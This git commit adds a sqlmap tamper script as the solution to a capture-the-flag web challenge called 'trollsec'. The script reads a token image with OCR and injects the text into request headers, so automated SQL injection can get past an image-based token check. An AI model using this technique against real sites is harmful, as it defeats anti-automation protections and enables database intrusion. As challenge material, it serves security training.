d8a8b9c389aff14382883c97176fa4e00008d146
fdcarl <fdcarl@fdcarl.com>
2018-09-29 23:47:24 -0700

    Adding solution (will probably need to be tweaked slightly as I change the challenge a bit)

---
+++ web/300-trollsec/solution/trollsec_tamper.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python
+
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+import string
+
+import pytesseract
+import requests
+from PIL import Image
+import io
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    url = 'http://127.0.0.1/token'
+    data = requests.get(url).content
+    img = Image.open(io.BytesIO(data))
+    text = pytesseract.image_to_string(img)
+
+    #print payload
+    kwargs['headers']['token']=text
+    print kwargs
+    #return "&token=" + text + "&id=" + payload
+
+    return payload
+    
+
